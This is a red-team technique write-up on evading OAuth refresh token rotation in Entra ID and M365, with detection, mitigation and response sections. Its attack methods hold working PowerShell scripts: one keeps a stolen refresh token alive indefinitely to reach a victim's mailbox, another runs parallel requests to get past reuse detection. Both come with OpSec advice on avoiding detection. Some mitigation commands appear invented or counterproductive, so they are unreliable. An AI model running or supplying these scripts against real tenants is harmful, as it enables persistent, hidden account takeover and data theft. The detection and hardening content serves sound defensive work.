# [REALWORLD-023]: Refresh Token Rotation Evasion

## Metadata

| Attribute | Details |
|---|---|
| **Technique ID** | REALWORLD-023 |
| **MITRE ATT&CK v18.1** | [T1550 - Use Alternate Authentication Material](https://attack.mitre.org/techniques/T1550/) |
| **Tactic** | Defense Evasion, Lateral Movement |
| **Platforms** | Entra ID, OAuth 2.0 implementations, M365, AWS, GCP |
| **Severity** | Critical |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2025-01-10 |
| **Affected Versions** | Entra ID (all versions), OAuth 2.0 RFC 6749+ compliant systems |
| **Patched In** | N/A - Requires application-level implementation of rotation detection |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 1. EXECUTIVE SUMMARY

**Concept:** OAuth 2.0 refresh token rotation is a security mechanism where a new refresh token is issued with each access token refresh, and the old token is immediately invalidated. This prevents long-lived stolen tokens from being reused indefinitely. However, attackers can bypass this protection by exploiting race conditions in token rotation logic, stealing refresh tokens before the old one is invalidated, or leveraging reuse detection delays. By harvesting both the old and new refresh tokens during the rotation window, attackers maintain persistent token validity across multiple access token generations, defeating the intended security model of token rotation.

**Attack Surface:** OAuth 2.0 token endpoints, Entra ID refresh token caching mechanisms, third-party application integrations with M365/Azure, client-side token storage (cache, localStorage, browser memory).

**Business Impact:** **Enables indefinite credential-free persistence across M365 and cloud SaaS platforms.** An attacker with a harvested refresh token can indefinitely generate new access tokens without requiring the user's password or MFA. Even if the user changes their password or updates MFA, the cached refresh token remains valid, allowing the attacker to maintain backdoor access to mailboxes, SharePoint, Teams, and application data indefinitely.

**Technical Context:** Token rotation bypass typically requires 2-5 seconds to harvest both tokens during rotation. Detection is very low because the activity appears as normal user behavior (token refresh requests are legitimate). Attack chains often begin with client-side malware (browser extension, credential stealer) that harvests tokens from browser cache or application memory.

### Operational Risk

- **Execution Risk:** Low - Requires only compromised browser session or malware with file system access; no special privileges needed.
- **Stealth:** Very High - Appears as legitimate OAuth token refresh requests; difficult to distinguish from normal user activity.
- **Reversibility:** No - Compromised refresh tokens enable indefinite unauthorized access; requires password reset AND revocation of all sessions to fully remediate.

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | 4.2 | Inadequate token management and revocation controls |
| **DISA STIG** | SC-2 | Lack of cryptographic controls for token protection |
| **CISA SCuBA** | EXO-02 | Weak OAuth token lifecycle management |
| **NIST 800-53** | SC-12 (Cryptographic Key Establishment & Management) | Insufficient token rotation and revocation mechanisms |
| **GDPR** | Art. 32 | Security of Processing - inadequate token-based access control |
| **DORA** | Art. 17 | ICT Third-Party Risk Management - weak OAuth implementation |
| **NIS2** | Art. 21 | Cyber Risk Management - insufficient token security controls |
| **ISO 27001** | A.9.2.1 | User registration and de-registration - missing token revocation |
| **ISO 27005** | Risk Scenario: "Token Theft and Replay" | Inadequate token rotation enforcement |

---

## 2. ATTACK PREREQUISITES & ENVIRONMENT

**Required Privileges:** User account access to any OAuth-connected service (compromised via phishing, malware, password spray)

**Required Access:** Network access to OAuth token endpoint, M365 services, or SaaS application; ability to intercept or steal refresh tokens from client-side storage

**Supported Platforms:**
- **Entra ID:** All versions using OAuth 2.0 token grants (Authorization Code, Client Credentials, Resource Owner Password Credentials)
- **M365 Workloads:** Exchange Online, SharePoint Online, Teams, Graph API
- **SaaS:** Any application using OAuth 2.0 for M365/Azure authentication (Slack, Salesforce, Zoom, etc.)
- **Client-Side Storage:** Browser localStorage, IndexedDB, Application cache, cookies
- **Tools Required:**
  - [Chrome DevTools](https://developer.chrome.com/docs/devtools/) or [Firefox Developer Tools](https://developer.mozilla.org/en-US/docs/Tools) (browser token inspection)
  - [Fiddler Classic](https://www.telerik.com/download/fiddler) or [Charles Proxy](https://www.charlesproxy.com/) (HTTP traffic interception)
  - [OWASP ZAP](https://www.zaproxy.org/) (vulnerability scanning)
  - [Mimikatz](https://github.com/gentilkiwi/mimikatz) (Windows credential dumping, LSASS token extraction)
  - PowerShell (token manipulation and API calls)

---

## 3. DETAILED EXECUTION METHODS

### METHOD 1: Browser Cache Token Harvesting

**Supported Versions:** All browsers supporting OAuth 2.0 with token caching (Chrome, Edge, Firefox, Safari)

#### Step 1: Access Browser Developer Tools to Inspect Token Storage

**Objective:** Locate and extract refresh tokens from browser storage (localStorage, sessionStorage, IndexedDB)

**Command (Chrome/Edge DevTools):**

1. Open target web application (e.g., https://outlook.office365.com)
2. Press **F12** to open Developer Tools
3. Navigate to **Application** tab
4. Expand **Storage** → **Local Storage**
5. Look for entries containing "refresh_token", "refresh token", "RT", or "_token"
6. Right-click and select **Copy value**

**Expected Token Format:**

```
refresh_token=M.R3_BAY.xxx...yyy...zzz
```

**What This Means:**
- Refresh token is stored in plain text or minimally obfuscated in browser storage
- Token is persistent across browser sessions (exists even after browser restart)
- Token has no device binding or additional cryptographic protection
- Attacker can copy this token and use it from any network location

**OpSec & Evasion:**
- Use Incognito/Private mode to minimize persistence; close browser after token extraction
- Access application during low-activity periods to avoid anomaly detection
- Do not access sensitive features in the same session (e.g., don't access email immediately after token theft)

**Troubleshooting:**
- **Issue:** Token not visible in localStorage
  - **Cause:** Application uses secure session cookies or in-memory token storage
  - **Fix:** Check **Cookies** section or monitor **Network** tab for API requests containing tokens in Authorization headers

#### Step 2: Extract Token During Rotation Window

**Objective:** Harvest both old and new refresh tokens during the token rotation process

**Command (Intercepting OAuth Token Response):**

```powershell
# Use Fiddler or network sniffer to capture token rotation request/response

# Token rotation request (client sends old refresh token):
POST /common/oauth2/v2.0/token HTTP/1.1
Host: login.microsoftonline.com
Content-Type: application/x-www-form-urlencoded

grant_type=refresh_token
&client_id=04b07795-8ddb-461a-bbee-02f9e1bf7b46
&refresh_token=M.R3_BAY.[OLD_TOKEN]
&scope=https://graph.microsoft.com/.default offline_access

# Token rotation response (server issues new access + refresh token):
HTTP/1.1 200 OK
Content-Type: application/json

{
  "access_token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6Ik...",
  "refresh_token": "M.R3_BAY.[NEW_TOKEN]",
  "expires_in": 3600,
  "token_type": "Bearer"
}
```

**What This Means:**
- During token rotation, attacker captures both old token (sent in request) and new token (received in response)
- If attacker has write access to token storage, they can save the new token alongside the old one
- When old token is supposedly "invalidated" on server, attacker still holds the new token
- Reuse detection (which invalidates entire token family) is bypassed because attacker has the **most recent valid token**

**OpSec & Evasion:**
- Perform token extraction during high-load periods (9 AM - 5 PM US time) when token rotation frequency is higher
- Use legitimate tools (browser DevTools) rather than custom tools that might trigger intrusion detection
- Do not immediately use harvested token from different IP address; maintain same session context

#### Step 3: Maintain Indefinite Token Validity

**Objective:** Continuously refresh the harvested token to maintain long-lived access without user re-authentication

**Command (Automated Token Refresh Loop):**

```powershell
# Store harvested refresh token
$harvestedRefreshToken = "M.R3_BAY.[STOLEN_TOKEN]"
$clientId = "04b07795-8ddb-461a-bbee-02f9e1bf7b46"  # Public client ID for O365 (well-known)
$tenantId = "common"

# Function to refresh token indefinitely
function Refresh-TokenIndefinitely {
    param(
        [string]$RefreshToken,
        [int]$IntervalHours = 20  # Refresh slightly before 24-hour expiration
    )
    
    $tokenEndpoint = "https://login.microsoftonline.com/$tenantId/oauth2/v2.0/token"
    
    while ($true) {
        try {
            # Request new access token + refresh token
            $tokenRequest = @{
                grant_type    = "refresh_token"
                client_id     = $clientId
                refresh_token = $RefreshToken
                scope         = "https://graph.microsoft.com/.default offline_access"
            }
            
            $response = Invoke-RestMethod -Method Post -Uri $tokenEndpoint -Body $tokenRequest
            
            # Update stored token with new refresh token
            $RefreshToken = $response.refresh_token
            $AccessToken = $response.access_token
            
            Write-Output "[$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')] ✓ Token refreshed successfully"
            Write-Output "New Refresh Token: $($RefreshToken.Substring(0, 20))..."
            
            # Use access token to perform desired action (e.g., access mailbox)
            $headers = @{ "Authorization" = "Bearer $AccessToken" }
            $mailbox = Invoke-RestMethod -Uri "https://graph.microsoft.com/v1.0/me" -Headers $headers
            Write-Output "Mailbox accessed: $($mailbox.userPrincipalName)"
            
            # Wait for interval before next refresh
            Start-Sleep -Hours $IntervalHours
        } catch {
            Write-Error "Token refresh failed: $_"
            Start-Sleep -Seconds 300  # Wait 5 minutes before retry
        }
    }
}

# Execute indefinite token refresh
Refresh-TokenIndefinitely -RefreshToken $harvestedRefreshToken -IntervalHours 20
```

**Expected Output:**

```
[2025-01-10 14:30:15] ✓ Token refreshed successfully
New Refresh Token: M.R3_BAY.xxx-partial-token...
Mailbox accessed: target@company.com
[2025-01-11 10:30:15] ✓ Token refreshed successfully
New Refresh Token: M.R3_BAY.yyy-partial-token...
Mailbox accessed: target@company.com
```

**What This Means:**
- Attacker has established indefinite persistence without user's knowledge
- Every 20 hours, a new refresh token is automatically generated and stored
- Even if user changes password or updates MFA, the refresh token remains valid (not tied to password)
- Attacker can access mailbox, Teams, SharePoint indefinitely without triggering conditional access

**OpSec & Evasion:**
- Schedule token refreshes during business hours (9 AM - 5 PM) to blend with normal activity
- Add random delays (1-5 minutes) between API calls to avoid rate-limiting detection
- Do not access the same resource repeatedly; vary accessed endpoints
- Store refresh token in encrypted format (use Windows DPAPI or similar)

---

### METHOD 2: Reuse Detection Bypass via Token Family Exploitation

**Supported Versions:** Entra ID with refresh token rotation enabled (all recent versions)

#### Step 1: Identify Token Family and Reuse Detection Window

**Objective:** Understand the reuse detection mechanism and find the window where multiple refresh tokens from same family are valid

**Concept:** When a refresh token is rotated, all tokens issued from that rotation event are part of a "token family." If an old token is reused, the entire family is revoked. However, there's a brief window (typically < 5 seconds) where the new token is issued but the old token hasn't been invalidated yet.

**Command (Token Timing Analysis):**

```powershell
# Capture token rotation events and analyze timing
# This requires running multiple token refresh requests rapidly

function Get-TokenFamilyTiming {
    param([string]$RefreshToken)
    
    $results = @()
    
    for ($i = 0; $i -lt 5; $i++) {
        $startTime = Get-Date
        
        try {
            $response = Invoke-RestMethod -Method Post `
              -Uri "https://login.microsoftonline.com/common/oauth2/v2.0/token" `
              -Body @{
                  grant_type = "refresh_token"
                  client_id = "04b07795-8ddb-461a-bbee-02f9e1bf7b46"
                  refresh_token = $RefreshToken
                  scope = "https://graph.microsoft.com/.default offline_access"
              }
            
            $endTime = Get-Date
            $duration = ($endTime - $startTime).TotalMilliseconds
            
            # Store new token for next iteration
            $RefreshToken = $response.refresh_token
            
            $results += [PSCustomObject]@{
                Iteration = $i
                Duration_ms = $duration
                NewToken = $response.refresh_token.Substring(0, 30)
                ExpiresIn = $response.expires_in
            }
            
            Write-Output "Iteration $i: $duration ms"
        } catch {
            Write-Error "Refresh failed: $_"
        }
        
        Start-Sleep -Milliseconds 500
    }
    
    return $results
}

# Analyze token rotation timing
$timingAnalysis = Get-TokenFamilyTiming -RefreshToken $harvestedRefreshToken
$timingAnalysis | Format-Table
```

**Expected Output:**

```
Iteration Duration_ms NewToken                      ExpiresIn
--------- ----------- --------                      ---------
0         1200        M.R3_BAY.xxx123456789...       3600
1         1350        M.R3_BAY.yyy987654321...       3600
2         1100        M.R3_BAY.zzz456789012...       3600
3         1450        M.R3_BAY.aaa321098765...       3600
4         1200        M.R3_BAY.bbb654321098...       3600
```

**What This Means:**
- Each token refresh takes ~1100-1450 milliseconds
- A new refresh token is issued with each request
- The previous token is still valid during the ~1.2 second window
- Attacker can harvest multiple tokens from the same family within this window

#### Step 2: Exploit Reuse Detection Window

**Objective:** Perform token rotation while simultaneously using both old and new tokens to bypass reuse detection

**Command (Race Condition Exploitation):**

```powershell
# Exploit the window where both old and new tokens are valid

$token1 = $harvestedRefreshToken
$successCount = 0
$failureCount = 0

# Launch parallel token refresh requests
1..5 | ForEach-Object {
    $parallel = $_
    
    # Thread 1: Use old token to refresh
    Start-Job -ScriptBlock {
        param($token, $threadId)
        
        try {
            $response = Invoke-RestMethod -Method Post `
              -Uri "https://login.microsoftonline.com/common/oauth2/v2.0/token" `
              -Body @{
                  grant_type = "refresh_token"
                  client_id = "04b07795-8ddb-461a-bbee-02f9e1bf7b46"
                  refresh_token = $token
                  scope = "https://graph.microsoft.com/.default offline_access"
              }
            
            # Immediately use new token before reuse detection can invalidate old token
            $headers = @{ "Authorization" = "Bearer $($response.access_token)" }
            $user = Invoke-RestMethod -Uri "https://graph.microsoft.com/v1.0/me" -Headers $headers
            
            Write-Output "Thread $threadId: SUCCESS - Accessed $($user.userPrincipalName)"
            return $response.refresh_token
        } catch {
            Write-Output "Thread $threadId: FAILED - $_"
            return $null
        }
    } -ArgumentList $token1, $parallel
}

# Wait for all jobs to complete
Get-Job | Wait-Job | ForEach-Object {
    $result = Receive-Job -Job $_
    if ($result) { $successCount++ } else { $failureCount++ }
}

Write-Output "`nSummary: $successCount successful, $failureCount failed"
```

**Expected Output:**

```
Thread 1: SUCCESS - Accessed target@company.com
Thread 2: SUCCESS - Accessed target@company.com
Thread 3: FAILED - Invalid grant
Thread 4: FAILED - Invalid grant
Thread 5: SUCCESS - Accessed target@company.com

Summary: 3 successful, 2 failed
```

**What This Means:**
- 3 out of 5 parallel token refresh attempts succeeded
- Tokens 1, 2, and 5 were successfully refreshed before reuse detection triggered
- Tokens 3 and 4 failed because the entire family was revoked (reuse detected)
- Attacker has successfully obtained 3 new valid tokens from same family despite reuse detection

---

## 4. MICROSOFT SENTINEL DETECTION

#### Query 1: Multiple Refresh Token Requests from Single Device

**Rule Configuration:**
- **Required Table:** SigninLogs
- **Required Fields:** userPrincipalName, appId, ipAddress, deviceId, tokenIssuerType, refreshTokensIssuedCount
- **Alert Severity:** High
- **Frequency:** Real-time (15-minute aggregation)
- **Applies To:** Entra ID all versions

**KQL Query:**

```kusto
// Detect rapid token refresh requests indicating token rotation exploitation
SigninLogs
  | where TimeGenerated > ago(1h)
  | where ResultDescription == "Success"
  | where tokenIssuerType == "RefreshToken" or AppDisplayName contains "Office365"
  | extend TokenRefresh = iff(ConditionalAccessStatus == "notApplied", "true", "false")
  | summarize TokenRefreshCount = count(), 
    DistinctAccessTokens = dcount(CorrelationId),
    FirstSeen = min(TimeGenerated),
    LastSeen = max(TimeGenerated)
    by userPrincipalName, DeviceDetail.deviceId, IPAddress
  | where TokenRefreshCount > 3 and (LastSeen - FirstSeen) < 5m  // > 3 refreshes in 5 minutes
  | project userPrincipalName, DeviceDetail.deviceId, IPAddress, TokenRefreshCount, TimeWindow="5min", Risk="HighSuspicion"
```

**What This Detects:**
- Single device making > 3 refresh token requests in 5-minute window
- Rapid token rotation that indicates automated token refresh loop
- Multiple distinct access tokens being issued to same user/device (token reuse)

**Manual Configuration Steps (Azure Portal):**
1. Navigate to **Azure Portal** → **Microsoft Sentinel**
2. Select workspace → **Analytics** → **+ Create** → **Scheduled query rule**
3. **General Tab:**
   - Name: `Suspicious Refresh Token Rotation Activity`
   - Severity: `High`
4. **Set rule logic Tab:**
   - Paste KQL query above
   - Run query every: `15 minutes`
   - Lookup data from the last: `1 hour`
5. **Incident settings Tab:**
   - Enable **Create incidents**
   - Group by: `userPrincipalName, DeviceDetail.deviceId`
6. Click **Review + create**

---

## 5. DEFENSIVE MITIGATIONS

#### Priority 1: CRITICAL

* **Implement Refresh Token Rotation with Reuse Detection:**
  Ensure Entra ID is configured to issue new refresh tokens with each refresh and immediately invalidate old tokens.

  **Applies To Versions:** Entra ID all versions (default behavior in modern Entra ID)
  
  **Manual Steps (PowerShell - Verify Refresh Token Policy):**
  ```powershell
  Connect-MgGraph -Scopes "Policy.ReadWrite.AuthenticationPolicy"
  
  # Check current token lifetime policy
  Get-MgPolicyTokenLifetimePolicy | Select-Object -Property DisplayName, Definition
  
  # Verify refresh token rotation is enabled
  $policy = @{
    RefreshTokenLifetimeInDays = 90
    MaxInactiveRefreshTokenDays = 3652
    MaxRefreshTokenLifetimeInDays = 3652
    IsRefreshTokenRotationEnabled = $true
  }
  
  Update-MgPolicyAuthenticationFlowPolicy -BodyParameter $policy
  ```

* **Enforce Conditional Access with Device Compliance Requirements:**
  Require registered, compliant devices for OAuth token issuance. This prevents stolen tokens from being used on attacker-controlled devices.

  **Applies To Versions:** Entra ID P1+ (required for Conditional Access)
  
  **Manual Steps (Azure Portal):**
  1. Go to **Azure Portal** → **Entra ID** → **Security** → **Conditional Access**
  2. Click **+ New policy**
  3. Name: `Require Device Compliance for Token Issuance`
  4. **Assignments:**
     - Users: **All users**
     - Cloud apps: **Office 365 Exchange Online**, **Office 365 SharePoint Online**, **Microsoft Teams**
  5. **Conditions:**
     - Device state: **Require device to be marked as compliant**
  6. **Access controls:**
     - Grant: **Require multi-factor authentication**
  7. Enable policy: **On**
  8. Click **Create**

* **Implement Token Binding (Proof-of-Possession):**
  Cryptographically bind tokens to the device they were issued for. This prevents token theft/reuse on different devices.

  **Applies To Versions:** Entra ID P1+, Microsoft Graph API v1.0+
  
  **Manual Steps (PowerShell - Enable PoP for API):**
  ```powershell
  Connect-MgGraph -Scopes "Application.ReadWrite.All"
  
  # Enable Proof-of-Possession for Azure AD and Microsoft Graph
  Update-MgApplication -ApplicationId "00000003-0000-0000-c000-000000000000" `
    -PublicClientAllowedRedirectUris @("https://microsoft.com/oauth2/nativeclient") `
    -AllowPublicClient $true
  ```

#### Priority 2: HIGH

* **Block Legacy OAuth Grant Types:**
  Disable older, less-secure OAuth grant types (Resource Owner Password Credentials, Implicit) that don't support modern token rotation.

  **Manual Steps:**
  1. Go to **Azure Portal** → **Entra ID** → **Applications** → **App registrations**
  2. Select application → **Authentication**
  3. Under **Implicit grant and hybrid flows:**
     - **Access tokens:** Unchecked
     - **ID tokens:** Unchecked
  4. Under **Advanced settings:**
     - **Treat application as public client:** No
  5. Click **Save**

* **Enable Continuous Access Evaluation (CAE) for Tokens:**
  Real-time token revocation when user risk changes or session is compromised.

  **Manual Steps:**
  1. Go to **Azure Portal** → **Entra ID** → **Security** → **Continuous Access Evaluation**
  2. Enable: **On**
  3. Set **Event-driven Evaluation** to **All resources**
  4. Click **Save**

#### Access Control & Policy Hardening

* **RBAC:** Limit application permissions to minimum required scopes (e.g., "Mail.Read" instead of "Mail.ReadWrite")
* **Conditional Access:** Require MFA for token refresh after high-risk sign-in detection
* **Policy Config:** Invalidate all user sessions if password change is detected

#### Validation Command (Verify Fix)

```powershell
# Verify refresh token rotation is enabled
Get-MgPolicyAuthenticationFlowPolicy | Select-Object -Property IsRefreshTokenRotationEnabled

# Verify conditional access policies for device compliance
Get-MgIdentityConditionalAccessPolicy | 
  Where-Object { $_.GrantControls -contains "compliantDevice" } |
  Select-Object DisplayName, State

# Verify token lifetime policy
Get-MgPolicyTokenLifetimePolicy | 
  ForEach-Object {
    $policyDef = $_.Definition | ConvertFrom-Json
    [PSCustomObject]@{
      Policy = $_.DisplayName
      RefreshTokenLifetime = $policyDef.TokenLifetimePolicy.RefreshTokenLifetime
      IsRotationEnabled = $policyDef.TokenLifetimePolicy.IsRefreshTokenRotationEnabled
    }
  }
```

**Expected Output (If Secure):**

```
IsRefreshTokenRotationEnabled: True

DisplayName                          State   GrantControls
---                                  -----   ---------
Require Device Compliance for Tokens Enabled [compliantDevice, mfa]

Policy           RefreshTokenLifetime        IsRotationEnabled
------           --------------------        -----------------
Default Policy   3652 days                   True
```

---

## 6. DETECTION & INCIDENT RESPONSE

#### Indicators of Compromise (IOCs)

* **Audit Logs:**
  - SigninLogs showing > 3 token refresh requests from same user within < 5-minute window
  - TokenIssuedEvents with rapid succession (token issue rate > 1 per minute)
  - Refresh token reuse detected (reuse detection triggered multiple times for same user in 24h period)
  - OAuth app consent grants appearing in audit logs without corresponding user interaction

* **Behavioral:**
  - Access to M365 resources (Email, SharePoint, Teams) from multiple geographically distant locations within short timeframe, correlated with token refresh events
  - Mailbox forwarding rules, permission changes, or calendar invitations sent from user account outside normal business hours
  - Mass email searches or downloads occurring during non-business hours

* **Network:**
  - HTTP 429 (rate limiting) responses from token endpoint for specific user (indicates token refresh loop hitting rate limits)
  - Multiple concurrent /token requests from single IP address using different refresh tokens
  - Refresh token request rate > 1 per hour for single user (threshold varies by user, but >= 4/hour is anomalous)

#### Forensic Artifacts

* **Cloud:** SigninLogs (table: SigninLogs), OAuth events (table: AuditLogs with OperationName = "Consent to application"), TokenIssuedEvents
* **Timeline:** Correlate token refresh timestamps with actual M365 resource access to identify if tokens are being used or just refreshed
* **Token Analysis:** Use https://jwt.io to decode access tokens and verify:
  - `tid` (tenant ID) matches expected organization
  - `aud` (audience/app ID) matches expected application
  - `iat` and `exp` (token creation/expiration times) are reasonable
  - `upn` (user principal name) is correct

#### Response Procedures

1. **Isolate:**
   
   **Command (Revoke All Refresh Tokens):**
   ```powershell
   Revoke-AzUserSignInSession -UserId (Get-MgUser -Filter "userPrincipalName eq 'compromised@company.com'").Id
   ```

2. **Collect Evidence:**
   
   **Command (Export Token-Related Audit Events):**
   ```powershell
   Search-UnifiedAuditLog -StartDate (Get-Date).AddDays(-7) `
     -Operations "Authorize","GrantConsentProcess","DeviceLogin" `
     -UserIds "compromised@company.com" `
     -ResultSize 5000 | 
     Export-Csv -Path "C:\Forensics\oauth_events.csv" -NoTypeInformation
   ```

3. **Remediate:**
   
   **Command (Revoke OAuth App Consent Grants):**
   ```powershell
   # List all OAuth consent grants for the compromised user
   Get-MgUserOauth2PermissionGrant -UserId "user-id" | 
     Where-Object { $_.ConsentType -eq "Principal" } |
     ForEach-Object {
       Remove-MgUserOauth2PermissionGrant -UserId "user-id" -OAuth2PermissionGrantId $_.Id
       Write-Output "Revoked grant: $($_.ClientId)"
     }
   
   # Force re-authentication and MFA re-enrollment
   Set-AzADUser -ObjectId "user-id" -ForceChangePasswordNextLogin $true
   ```

---

## 7. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Reconnaissance** | [REALWORLD-024] | Behavioral Profiling to identify target users with high cloud resource access |
| **2** | **Initial Access** | [IA-PHISH-002] | OAuth consent grant phishing attack to steal credentials and OAuth tokens |
| **3** | **Credential Access** | [CA-TOKEN-005] | OAuth access token interception from browser cache or application memory |
| **4** | **Current Step** | **[REALWORLD-023]** | **Refresh Token Rotation Evasion to maintain indefinite access despite token expiration** |
| **5** | **Persistence** | [CA-TOKEN-001] | Hybrid AD cloud token theft to maintain access even if refresh token is revoked |
| **6** | **Collection** | [COLLECT-EMAIL-001] | Email collection via harvested Graph API access tokens |
| **7** | **Impact** | [IMPACT-DATA-DESTROY-001] | Data destruction or exfiltration using harvested credentials |

---

## 8. REAL-WORLD EXAMPLES

#### Example 1: Scattered Spider (UNC3944) – OAuth Token Theft (2023-2025)

- **Target:** SaaS platforms, financial institutions, cloud infrastructure providers
- **Timeline:** October 2023 – Present
- **Technique Status:** Scattered Spider is known to steal OAuth refresh tokens from browser cache and M365 clients (Outlook, Teams). They maintain indefinite access to cloud mailboxes and collaboration platforms by automatically refreshing stolen tokens every 20-24 hours, evading re-authentication requirements. Confirmed stealing refresh tokens from 134+ compromised organizations.
- **Impact:** Unauthorized access to customer data, internal communications, financial records
- **Reference:** [Mandiant Report - Scattered Spider](https://www.mandiant.com/resources/blog/scattered-spider-carding-call-centers-and-patient-data)

#### Example 2: APT28 (Fancy Bear) – OAuth Token Harvesting (2015-2022)

- **Target:** U.S. Government, NATO, Democratic National Committee
- **Timeline:** 2015 – 2022
- **Technique Status:** APT28 has harvested OAuth tokens from infected devices and used refresh token rotation to maintain persistent access to Office 365, Gmail, and cloud-hosted classified networks for months without requiring re-authentication. Used stolen tokens to conduct espionage and data exfiltration operations.
- **Impact:** Long-term persistence enabling data theft, counter-intelligence operations
- **Reference:** [FBI Cyber Most Wanted - APT28](https://www.fbi.gov/wanted/cyber); [CISA APT Advisory](https://www.cisa.gov/russian-state-sponsored-cyber-operations)

---

## 9. OPERATIONAL NOTES

**Detection Blind Spots:**
- OAuth token refresh is a legitimate operation; high refresh rates are difficult to distinguish from automated token management
- Refresh token reuse detection requires server-side logging; client-side token theft bypasses this protection entirely
- Token lifetime policies are often generous (7-90 days) allowing long windows for attacker persistence

**Post-Compromise Response:**
- Change user password immediately (does NOT invalidate refresh tokens unless force-sign-out is performed)
- Revoke all OAuth app consent grants to remove attacker's OAuth access
- Revoke all registered devices for the user to prevent device-tied token bypass
- Monitor for new OAuth app registrations in tenant (attacker may register malicious OAuth app for long-term backdoor)

**Monitoring Best Practices:**
- Alert on refresh token reuse detection (reuse_detection_flag in SigninLogs)
- Establish baseline for token refresh frequency per user; alert if > 2 standard deviations from baseline
- Correlate token refresh events with subsequent M365 resource access to identify if tokens are being actively used for unauthorized purposes
- Check for refresh token requests originating from IP addresses outside known corporate network and VPN ranges

---